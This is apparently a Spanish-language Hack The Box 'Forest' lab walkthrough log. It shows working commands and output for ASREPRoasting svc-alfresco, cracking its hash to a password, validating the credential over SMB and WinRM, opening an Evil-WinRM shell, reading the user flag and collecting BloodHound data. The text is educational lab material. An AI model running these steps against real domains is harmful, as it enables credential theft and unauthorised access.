GetNPUsers se ejecutó con un usersfile vacío, por lo que no tenía ningún usuario sobre el que trabajar.

Suposiciones

La cuenta svc-alfresco puede seguir siendo válida para Kerberos aunque la consulta LDAP por sAMAccountName no haya devuelto resultado.

La aparición previa de CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local justifica una validación directa contra Kerberos.

La falta de salida de GetNPUsers en el último intento se debe a la lista vacía, no a que Kerberos haya descartado necesariamente la cuenta.

La resolución por /etc/hosts debe comprobarse, porque en la secuencia aparece una posible escritura accidental hacia /etc/hosts+. Aunque LDAP se está usando por IP, conviene dejar la resolución limpia.

Método

Primero se comprueba que /etc/hosts apunta correctamente a la nueva IP.

Después se valida si svc-alfresco puede localizarse por cn, no por sAMAccountName.

A continuación se crea manualmente una lista mínima con svc-alfresco, porque ya existe evidencia LDAP previa del CN.

Finalmente se ejecuta GetNPUsers contra esa cuenta concreta.

Si aparece un hash $krb5asrep$, la rama ASREPRoasting queda confirmada y la siguiente fase será crackeo offline.

Respuesta

La ruta sigue siendo válida, pero hay que corregir la secuencia.

No debe usarse ahora content/users/asrep_candidates.txt tal como está, porque está vacío.

La mejor validación corta es probar svc-alfresco directamente con GetNPUsers.

Esto no es un salto sin evidencia: la cuenta ya apareció en LDAP como objeto bajo OU=Service Accounts. Lo que falta es confirmar si Kerberos permite obtener el AS-REP.

Comandos
cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Este comando fija el directorio de trabajo correcto.

grep -nE 'forest\.htb\.local|htb\.local|FOREST' /etc/hosts

Este comando comprueba si /etc/hosts contiene la entrada correcta para Forest.

La salida útil debe contener:

10.129.95.210 forest.htb.local htb.local FOREST

Si aparece una entrada antigua con 10.129.34.129, debe eliminarse.

getent hosts htb.local
getent hosts forest.htb.local

Estos comandos verifican la resolución local.

La salida esperada debe apuntar a:

10.129.95.210
ldapsearch -x -H ldap://10.129.95.210:389 -b "dc=htb,dc=local" \
  "(cn=svc-alfresco)" \
  dn cn name sAMAccountName userPrincipalName userAccountControl memberOf \
  | tee content/ldap/svc_alfresco_by_cn.ldif

Este comando busca la cuenta por cn, no por sAMAccountName.

La razón es que la enumeración anterior confirmó el objeto como CN=svc-alfresco, pero la búsqueda por sAMAccountName no devolvió resultados.

La parte útil de la salida será comprobar si aparece:

dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
printf 'svc-alfresco\n' | tee content/users/asrep_candidates.txt

Este comando crea una lista mínima de candidatos ASREPRoasting con la cuenta observada.

Se hace manualmente porque la búsqueda LDAP por flag no se llegó a ejecutar correctamente y porque svc-alfresco ya está justificada como candidata por evidencia previa.

cat content/users/asrep_candidates.txt

La salida debe ser:

svc-alfresco
impacket-GetNPUsers htb.local/ \
  -dc-ip 10.129.95.210 \
  -usersfile content/users/asrep_candidates.txt \
  -no-pass \
  -outputfile loot/ad/asrep_hashes.txt

Este comando solicita un AS-REP para la cuenta candidata sin aportar contraseña.

La señal importante es una línea que empiece por:

$krb5asrep$
cat loot/ad/asrep_hashes.txt

Este comando permite comprobar si el hash quedó guardado.

Si el archivo contiene $krb5asrep$, la fase ASREPRoasting queda confirmada.

Comprobaciones

Debe comprobarse que /etc/hosts contiene la nueva IP 10.129.95.210.

Debe comprobarse que no queda una entrada antigua de Forest con 10.129.34.129.

Debe comprobarse si la búsqueda por cn=svc-alfresco devuelve el DN de la cuenta.

Debe comprobarse que content/users/asrep_candidates.txt contiene:

svc-alfresco

Debe comprobarse si loot/ad/asrep_hashes.txt contiene una línea $krb5asrep$.

Si aparece el hash, la siguiente fase será crackeo offline.

Si no aparece el hash, habrá que revisar si el problema es de nombre de usuario, dominio, reloj Kerberos o resolución.

Registro didáctico

En esta fase hay dos aprendizajes importantes.

El primero es que una lista vacía no produce una prueba negativa. GetNPUsers no falló contra svc-alfresco; simplemente no recibió ningún usuario válido porque el archivo de entrada estaba vacío.

El segundo es que LDAP puede mostrar un objeto por su CN sin que una consulta posterior por sAMAccountName devuelva lo esperado. En ese caso, la decisión correcta no es descartar la cuenta, sino validar con una búsqueda alternativa y después probar la identidad Kerberos candidata.

El hallazgo dominante sigue siendo svc-alfresco.

La rama principal activa sigue siendo AD / LDAP / Kerberos.

Las ramas secundarias siguen siendo WinRM y SMB.

El siguiente paso único es ejecutar GetNPUsers contra svc-alfresco con una lista no vacía.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ printf 'svc-alfresco\n' | tee content/users/asrep_candidates.txt
svc-alfresco
❯ impacket-GetNPUsers htb.local/ \
  -dc-ip 10.129.95.210 \
  -usersfile content/users/asrep_candidates.txt \
  -no-pass \
  -outputfile loot/ad/asrep_hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f6141a645e4d299569ee170fa325d27a$485d6a64b1c4326244ca5ec707892022a1471570d02a8012360b22da60e7e7eb85a5c67b8b406240b9db4a565b1bda5e2e3cc43bb2fdb5d10755dff78e6efa615340919ce5447a607fb94b12c554d3dfbe31c8f4a728a5d5cb7da9c9cf3638a999664b5984feed2c04215231628cda83ef1fbd3cfbccbec5d6cde45464a3ac3d739c4d2a6975ac2e1a85ccbbd5204f12bc82528eaf3733b015335c8ae487d29f4c7ff9e5483f9f0be6874f19888bd78d3a180d62da487af5b6f748c51bab6119033dd32583d83dc230c2c1fb7d9506b11d5f47f3de3aeee4802c8832716ebf970564ad646490
❯ cat loot/ad/asrep_hashes.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/ad/asrep_hashes.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$svc-alfresco@HTB.LOCAL:f6141a645e4d299569ee170fa325d27a$485d6a64b1c4326244ca5ec707892022a1471570d02a8012360b22da60e7e7eb85a5c67b8b406240b9db4a565b1bda5e2e3cc43bb2fdb5d10755dff78e6efa615340919ce5447a60
       │ 7fb94b12c554d3dfbe31c8f4a728a5d5cb7da9c9cf3638a999664b5984feed2c04215231628cda83ef1fbd3cfbccbec5d6cde45464a3ac3d739c4d2a6975ac2e1a85ccbbd5204f12bc82528eaf3733b015335c8ae487d29f4c7ff9e5483f9f0be6874f19888bd78d3a180d
       │ 62da487af5b6f748c51bab6119033dd32583d83dc230c2c1fb7d9506b11d5f47f3de3aeee4802c8832716ebf970564ad646490
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## Conclusiones

La vía ASREPRoasting queda confirmada.

Kerberos ha entregado un hash $krb5asrep$ para la cuenta:

svc-alfresco@HTB.LOCAL

Esto demuestra que la cuenta svc-alfresco no requiere preautenticación Kerberos. Por tanto, puede solicitarse material cifrado asociado a la cuenta sin conocer previamente su contraseña.

El hallazgo dominante cambia de:

cuenta candidata svc-alfresco

a:

hash Kerberos AS-REP obtenido para svc-alfresco

La siguiente fase ya no es enumerar LDAP. La siguiente fase es crackeo offline del hash.

Objetivo

Recuperar la contraseña de svc-alfresco mediante crackeo offline del hash AS-REP obtenido.

La finalidad no es iniciar sesión todavía, sino transformar el hash Kerberos en una credencial verificable.

Hechos verificados

Existe una lista de candidatos ASREPRoasting con:

svc-alfresco

impacket-GetNPUsers ha devuelto un hash válido con formato:

$krb5asrep$23$svc-alfresco@HTB.LOCAL:...

El hash ha quedado guardado en:

loot/ad/asrep_hashes.txt

La técnica ASREPRoasting queda confirmada por evidencia local.

La cuenta afectada es:

svc-alfresco

El dominio Kerberos observado en el hash es:

HTB.LOCAL
Suposiciones

La contraseña de svc-alfresco puede estar en un diccionario común como rockyou.txt.

Si se recupera la contraseña, el siguiente servicio lógico para validarla será WinRM, porque el puerto 5985/tcp está abierto.

Todavía no queda verificado que la credencial permita acceso remoto.

Método

Primero se realiza crackeo offline del hash AS-REP.

Después se guarda el resultado en un archivo de evidencia.

Si se obtiene una contraseña, se valida de forma controlada contra servicios reales del dominio.

La validación debe seguir este orden:

comprobar que la contraseña se ha recuperado;
validar credencial contra SMB o WinRM;
si WinRM acepta la credencial, consolidar acceso remoto;
una vez dentro, verificar usuario, hostname y contexto real.
Respuesta

La cadena de explotación avanza correctamente.

La fase LDAP/Kerberos ha producido una primitiva clara: un hash AS-REP crackeable offline.

El siguiente paso único es lanzar john contra loot/ad/asrep_hashes.txt.

Comandos
cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Este comando fija el directorio de trabajo de Forest.

john --wordlist=/usr/share/wordlists/rockyou.txt loot/ad/asrep_hashes.txt

Este comando intenta recuperar la contraseña de svc-alfresco usando el diccionario rockyou.txt.

La prueba es offline: no realiza autenticación contra el dominio ni genera tráfico contra Forest.

john --show loot/ad/asrep_hashes.txt | tee loot/ad/asrep_cracked.txt

Este comando muestra el resultado recuperado por John y lo guarda como evidencia.

La parte importante de la salida será una línea parecida a:

svc-alfresco:<password>

Si John recupera la contraseña, la siguiente validación puede hacerse así:

netexec smb 10.129.95.210 -u svc-alfresco -p '<PASSWORD>'

Este comando valida si la credencial es aceptada por SMB.

Si SMB confirma la credencial, se puede comprobar WinRM:

netexec winrm 10.129.95.210 -u svc-alfresco -p '<PASSWORD>'

La señal útil será que WinRM indique autenticación correcta.

Comprobaciones

Debe existir el archivo:

loot/ad/asrep_hashes.txt

Debe contener una línea $krb5asrep$.

Debe ejecutarse John sobre ese archivo.

Debe guardarse el resultado en:

loot/ad/asrep_cracked.txt

Si se recupera contraseña, debe validarse sin asumir acceso todavía.

El siguiente hallazgo esperado es una credencial válida para:

svc-alfresco
Registro didáctico

ASREPRoasting aprovecha una configuración insegura de Kerberos: una cuenta sin preautenticación obligatoria.

En condiciones normales, Kerberos exige una prueba previa antes de entregar material cifrado asociado a una cuenta. Si esa preautenticación está deshabilitada, un atacante puede solicitar un AS-REP y recibir datos cifrados con material derivado de la contraseña del usuario.

La explotación directa no ocurre contra el servicio en ese momento. El valor del hallazgo está en que el hash puede atacarse offline.

El hallazgo dominante actual es el hash AS-REP de svc-alfresco.

La rama principal activa sigue siendo AD / Kerberos.

La rama secundaria inmediata pasa a ser WinRM, pendiente de recuperar y validar una contraseña.

El siguiente paso único es crackear loot/ad/asrep_hashes.txt.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ john --wordlist=/usr/share/wordlists/rockyou.txt loot/ad/asrep_hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:05 DONE (2026-04-29 13:44) 0.1996g/s 815520p/s 815520c/s 815520C/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
❯ john --show loot/ad/asrep_hashes.txt | tee loot/ad/asrep_cracked.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice

1 password hash cracked, 0 left
❯ netexec smb 10.129.95.210 -u svc-alfresco -p 's3rvice'
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice
❯ netexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

## Conclusiones

La fase de ASREPRoasting queda cerrada con éxito.

El hash Kerberos obtenido para svc-alfresco ha sido crackeado correctamente y la contraseña recuperada es:

s3rvice

La credencial ha sido validada contra SMB y WinRM:

htb.local\svc-alfresco:s3rvice

La validación contra WinRM devuelve Pwn3d!, por lo que existe acceso remoto interactivo como svc-alfresco.

El hallazgo dominante ya no es el hash AS-REP, sino una credencial válida con acceso WinRM.

La rama principal cambia de:

AD / Kerberos

a:

WinRM / foothold inicial
Objetivo

Consolidar el primer acceso remoto a Forest mediante WinRM y verificar el contexto real de la sesión.

La finalidad inmediata es entrar como svc-alfresco, confirmar usuario, host, dominio y permisos básicos, y dejar registrada la evidencia mínima del foothold.

Hechos verificados

John ha crackeado correctamente el hash AS-REP:

svc-alfresco:s3rvice

El archivo de evidencia se ha guardado en:

loot/ad/asrep_cracked.txt

SMB acepta la credencial:

htb.local\svc-alfresco:s3rvice

WinRM acepta la credencial y devuelve:

Pwn3d!

El sistema remoto sigue identificado como:

Windows Server 2016 Standard 14393
FOREST
htb.local

El puerto WinRM abierto es:

5985/tcp
Suposiciones

La cuenta svc-alfresco permite iniciar una sesión PowerShell remota mediante WinRM.

El acceso inicial será de usuario de dominio, no de administrador local.

La siguiente fase útil no es repetir Kerberos, sino enumerar el contexto local y de dominio desde la sesión obtenida.

La ruta posterior probable será análisis de pertenencia a grupos y permisos en Active Directory.

Método

La secuencia correcta pasa ahora por cuatro pasos:

Abrir sesión WinRM con la credencial recuperada.
Confirmar contexto real de usuario, host y dominio.
Obtener evidencia del primer acceso.
Enumerar grupos y privilegios básicos de svc-alfresco.

No debe asumirse todavía escalada ni privilegios altos. La sesión debe validarse primero con comandos simples.

Respuesta

La cadena inicial queda así:

LDAP anonymous bind
-> identificación de svc-alfresco
-> ASREPRoasting
-> hash Kerberos AS-REP
-> crackeo offline
-> contraseña s3rvice
-> validación SMB
-> validación WinRM
-> foothold como svc-alfresco

La siguiente acción única es abrir sesión con Evil-WinRM y documentar el contexto real.

Comandos
cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Este comando fija el directorio de trabajo de Forest.

evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'

Este comando abre una sesión remota PowerShell mediante WinRM usando la credencial validada.

Dentro de la sesión WinRM, los primeros comandos deben ser de verificación:

whoami
hostname
whoami /user
whoami /groups

Estos comandos confirman:

usuario efectivo;
nombre del host;
SID del usuario;
grupos asignados a la sesión.

También conviene registrar el directorio inicial:

pwd

Y comprobar el perfil del usuario:

dir C:\Users\svc-alfresco
dir C:\Users\svc-alfresco\Desktop

Si existe user.txt, puede leerse como evidencia de acceso de usuario:

type C:\Users\svc-alfresco\Desktop\user.txt
Comprobaciones

Debe comprobarse que evil-winrm abre sesión sin error.

Debe confirmarse que whoami devuelve:

htb\svc-alfresco

Debe confirmarse que el host es:

FOREST

Debe guardarse la evidencia del acceso inicial.

Debe revisarse whoami /groups porque la pertenencia a grupos de svc-alfresco será clave para decidir la siguiente rama.

Registro didáctico

El crackeo del hash AS-REP no proporciona acceso por sí mismo. Su valor está en convertir un fallo de configuración Kerberos en una credencial reutilizable.

La validación contra SMB demuestra que la contraseña es correcta para el dominio.

La validación contra WinRM demuestra que, además de ser correcta, la cuenta puede abrir una sesión remota en el servidor.

La fase actual ya no trata de Kerberos, sino de consolidación del primer acceso.

El hallazgo dominante actual es:

credencial válida de svc-alfresco con acceso WinRM

La rama principal activa pasa a ser:

WinRM / foothold inicial

Las ramas secundarias quedan así:

SMB: validación de credencial y posible enumeración complementaria
AD / BloodHound: siguiente fase tras confirmar grupos y contexto
Kerberos: cerrada por ahora, ya produjo credencial

El siguiente paso único es entrar por Evil-WinRM y ejecutar la verificación mínima de contexto.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> hostname
FOREST
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /user

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> pwd

Path
----
C:\Users\svc-alfresco\Documents


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir C:\Users\svc-alfresco


    Directory: C:\Users\svc-alfresco


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/23/2019   2:16 PM                Desktop
d-r---        9/22/2019   4:02 PM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir C:\Users\svc-alfresco\Desktop


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/29/2026   4:28 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type C:\Users\svc-alfresco\Desktop\user.txt
789fa35a3fbdddb31ceee14fa4bdc109

Conclusiones

El foothold inicial queda confirmado.

La sesión WinRM se ha abierto correctamente como:

htb\svc-alfresco

La flag de usuario se ha leído correctamente desde:

C:\Users\svc-alfresco\Desktop\user.txt

La pertenencia a grupos revela el hallazgo más importante de esta fase: svc-alfresco pertenece a BUILTIN\Account Operators.

Este dato cambia el foco de la máquina. Ya no se trata solo de tener una shell de usuario, sino de analizar qué acciones de administración de cuentas permite esta pertenencia dentro del dominio.

La rama principal pasa a ser:

AD / enumeración de privilegios / abuso de grupos

El siguiente paso único es preparar la enumeración con BloodHound o, como mínimo, confirmar manualmente qué puede modificar svc-alfresco dentro del dominio.

Objetivo

Documentar el acceso inicial y preparar la fase de escalada en Active Directory.

La finalidad inmediata es entender el valor real de la pertenencia a Account Operators y decidir cómo puede convertirse en una ruta hacia privilegios superiores.

Hechos verificados

La conexión WinRM funciona con la credencial:

htb.local\svc-alfresco:s3rvice

El usuario efectivo de la sesión es:

htb\svc-alfresco

El host comprometido es:

FOREST

El SID del usuario es:

S-1-5-21-3072663084-364016917-1341370565-1147

El directorio inicial de la sesión es:

C:\Users\svc-alfresco\Documents

Existe el perfil local:

C:\Users\svc-alfresco

Existe user.txt en:

C:\Users\svc-alfresco\Desktop\user.txt

La flag de usuario ha sido leída y validada en HTB.

Los grupos relevantes observados en la sesión son:

BUILTIN\Remote Management Users
BUILTIN\Account Operators
HTB\Privileged IT Accounts
HTB\Service Accounts

La pertenencia a Remote Management Users explica el acceso por WinRM.

La pertenencia a Account Operators es el hallazgo dominante para la siguiente fase.

Suposiciones

La cuenta svc-alfresco no es administradora local directa.

El valor principal de esta cuenta está en permisos de administración dentro del dominio, no en privilegios locales inmediatos.

La pertenencia a Account Operators puede permitir crear o modificar cuentas y grupos no protegidos.

La presencia de Exchange en el dominio puede ser relevante para una ruta de escalada posterior, especialmente por grupos como Exchange Windows Permissions.

Todavía no está verificado qué ruta exacta conduce a privilegios de dominio. Esa ruta debe confirmarse con enumeración de relaciones y ACLs.

Método

La fase siguiente debe centrarse en enumerar relaciones de dominio.

Primero se conserva la evidencia del contexto de la sesión.

Después se analiza la pertenencia a grupos de svc-alfresco.

A continuación se recolecta información de Active Directory con BloodHound o se enumeran manualmente grupos, ACLs y permisos relevantes.

El objetivo técnico no es ejecutar comandos al azar como usuario comprometido, sino responder a una pregunta concreta:

¿Qué puede modificar svc-alfresco dentro del dominio?

Si se confirma que puede crear una cuenta o añadirla a un grupo con permisos útiles, la siguiente fase será construir esa ruta con trazabilidad.

Respuesta

La máquina entra ahora en su segunda gran fase.

La primera fase produjo acceso inicial:

LDAP anonymous bind
-> svc-alfresco
-> ASREPRoasting
-> s3rvice
-> WinRM
-> user.txt

La segunda fase debe buscar escalada de privilegios en Active Directory.

La señal que justifica el cambio de rama es clara:

BUILTIN\Account Operators

No conviene empezar aún por técnicas destructivas ni por intentos directos de administrador. La siguiente acción correcta es mapear permisos.

Comandos

Dentro de la sesión WinRM, puede guardarse una evidencia básica del contexto:

whoami
hostname
whoami /user
whoami /groups

Estos comandos ya se han ejecutado y han confirmado el usuario, host, SID y grupos.

Para continuar con enumeración manual básica desde la sesión:

net user svc-alfresco /domain

Este comando muestra información del usuario de dominio svc-alfresco.

La parte importante será revisar grupos globales, última conexión, estado de la cuenta y pertenencias visibles.

net group "Account Operators" /domain

Este comando enumera los miembros del grupo Account Operators.

Sirve para confirmar que la pertenencia observada en whoami /groups encaja con la información del dominio.

net group "Exchange Windows Permissions" /domain

Este comando comprueba el grupo Exchange Windows Permissions.

Ese grupo es relevante porque ya se observó presencia de Exchange en LDAP y puede formar parte de rutas de privilegios dentro del dominio.

net group "Remote Management Users" /domain

Este comando revisa el grupo relacionado con acceso remoto.

La finalidad es entender si el acceso WinRM de svc-alfresco viene por pertenencia directa o por grupos anidados.

Para preparar recolección con BloodHound desde la máquina atacante, el enfoque limpio será descargar o usar SharpHound y recolectar datos del dominio con la cuenta ya comprometida.

Desde Evil-WinRM, si se dispone de SharpHound.exe en la máquina atacante:

upload SharpHound.exe

Después, en la sesión remota:

.\SharpHound.exe -c All

Este comando recolecta información de Active Directory para analizar relaciones, grupos, sesiones, ACLs y rutas de privilegios.

Al finalizar, debe aparecer un archivo .zip en el directorio actual. Ese archivo se descarga con:

download <ARCHIVO_BLOODHOUND>.zip
Comprobaciones

Debe quedar documentado que svc-alfresco tiene acceso WinRM.

Debe quedar documentado que user.txt fue accesible desde el perfil del usuario.

Debe quedar documentado que svc-alfresco pertenece a:

BUILTIN\Account Operators
HTB\Privileged IT Accounts
HTB\Service Accounts
BUILTIN\Remote Management Users

Debe comprobarse si Account Operators permite crear o modificar usuarios en el dominio.

Debe comprobarse si existe una ruta desde svc-alfresco hacia grupos de Exchange con permisos útiles.

Debe comprobarse si BloodHound identifica una ruta hacia un objetivo de alto valor.

Registro didáctico

El acceso inicial por WinRM no implica privilegios administrativos. La validación de contexto es imprescindible para evitar asumir más de lo que realmente se tiene.

En esta máquina, whoami /groups es más importante que la propia lectura de user.txt, porque revela la posible vía de escalada.

La pertenencia a Remote Management Users explica el acceso remoto.

La pertenencia a Service Accounts explica el contexto funcional de la cuenta.

La pertenencia a Privileged IT Accounts y, especialmente, a Account Operators, indica que la escalada probablemente no será local clásica, sino de Active Directory.

El hallazgo dominante actual es:

svc-alfresco pertenece a Account Operators

La rama principal activa es:

AD / permisos de dominio / BloodHound

Las ramas secundarias quedan así:

WinRM: acceso consolidado
SMB: validación complementaria
Kerberos: cerrada como vía inicial

El siguiente paso único es enumerar relaciones y permisos de dominio para confirmar una ruta de escalada.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
mkdir -p content/bloodhound
cd content/bloodhound
❯ bloodhound-python -h
usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-no-pass] [-aesKey hex key] [--auth-method {auto,ntlm,kerberos}] [-ns NAMESERVER] [--dns-tcp]
                         [--dns-timeout DNS_TIMEOUT] [-dc HOST] [-gc HOST] [-w WORKERS] [--exclude-dcs] [--disable-pooling] [--disable-autogc] [--zip] [--computerfile COMPUTERFILE] [--cachefile CACHEFILE]
                         [--ldap-channel-binding] [--use-ldaps] [-op PREFIX_NAME]

Python based ingestor for BloodHound LEGACY
For help or reporting issues, visit https://github.com/dirkjanm/BloodHound.py

❯ bloodhound-python \
  -u 'svc-alfresco' \
  -p 's3rvice' \
  -d htb.local \
  -dc forest.htb.local \
  -ns 10.129.95.210 \
  -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: forest.htb.local
INFO: Testing resolved hostname connectivity dead:beef::188
INFO: Trying LDAP connection to dead:beef::188
INFO: Testing resolved hostname connectivity dead:beef::5038:4ec:cb2d:87ee
INFO: Trying LDAP connection to dead:beef::5038:4ec:cb2d:87ee
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: forest.htb.local
INFO: Testing resolved hostname connectivity dead:beef::188
INFO: Trying LDAP connection to dead:beef::188
INFO: Testing resolved hostname connectivity dead:beef::5038:4ec:cb2d:87ee
INFO: Trying LDAP connection to dead:beef::5038:4ec:cb2d:87ee
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 17S

❯ ls -lah
drwxr-xr-x r4mon r4mon 368 B  Wed Apr 29 17:03:32 2026  .
drwxr-xr-x r4mon r4mon  66 B  Wed Apr 29 17:01:40 2026  ..
.rw-r--r-- r4mon r4mon 7.1 KB Wed Apr 29 17:03:37 2026  20260429170320_computers.json
.rw-r--r-- r4mon r4mon  26 KB Wed Apr 29 17:03:31 2026  20260429170320_containers.json
.rw-r--r-- r4mon r4mon 3.7 KB Wed Apr 29 17:03:32 2026  20260429170320_domains.json
.rw-r--r-- r4mon r4mon 3.0 KB Wed Apr 29 17:03:29 2026  20260429170320_gpos.json
.rw-r--r-- r4mon r4mon 143 KB Wed Apr 29 17:03:29 2026  20260429170320_groups.json
.rw-r--r-- r4mon r4mon  26 KB Wed Apr 29 17:03:30 2026  20260429170320_ous.json
.rw-r--r-- r4mon r4mon  98 KB Wed Apr 29 17:03:28 2026  20260429170320_users.json

❯ zip forest_bloodhound_$(date +%Y%m%d_%H%M%S).zip *.json
  adding: 20260429170320_computers.json (deflated 83%)
  adding: 20260429170320_containers.json (deflated 93%)
  adding: 20260429170320_domains.json (deflated 77%)
  adding: 20260429170320_gpos.json (deflated 82%)
  adding: 20260429170320_groups.json (deflated 95%)
  adding: 20260429170320_ous.json (deflated 94%)
  adding: 20260429170320_users.json (deflated 96%)

## Conclusiones

La recolección con bloodhound-python se ha completado con éxito suficiente para continuar.

Aunque aparecen avisos de Kerberos y clock skew, la herramienta ha generado los archivos principales de BloodHound:

computers.json
containers.json
domains.json
gpos.json
groups.json
ous.json
users.json

También se ha generado correctamente el ZIP:

content/bloodhound/forest_bloodhound_20260429_170450.zip

El siguiente paso único es importar ese ZIP en BloodHound y buscar la ruta de privilegios desde svc-alfresco.

Objetivo

Analizar las relaciones de Active Directory recolectadas con BloodHound para confirmar una ruta de escalada desde la cuenta comprometida svc-alfresco.

La finalidad inmediata es verificar si la pertenencia a Account Operators permite llegar a un grupo o permiso con impacto sobre el dominio.

Hechos verificados

bloodhound-python está instalado y funciona.

La herramienta autenticó con la credencial:

htb.local\svc-alfresco:s3rvice

La recolección encontró:

1 dominio
2 equipos
32 usuarios
76 grupos
2 GPOs
15 OUs
20 contenedores
0 trusts

Se generaron archivos JSON en:

/home/r4mon/pentest/targets/HTB/easy/FOREST/content/bloodhound

Se generó el archivo comprimido:

forest_bloodhound_20260429_170450.zip

Apareció un aviso relevante:

KRB_AP_ERR_SKEW(Clock skew too great)

Ese aviso afecta a parte de la enumeración Kerberos/DCE-RPC, pero no invalida la recolección LDAP ya obtenida.

Suposiciones

Los datos generados son suficientes para analizar usuarios, grupos, OUs, dominio y muchas relaciones LDAP.

La parte de sesiones o detalles de equipos puede estar incompleta por el problema de desfase horario.

La ruta principal probable sigue estando en permisos de dominio y grupos, no en escalada local clásica.

svc-alfresco debe marcarse como usuario comprometido en BloodHound.

Método

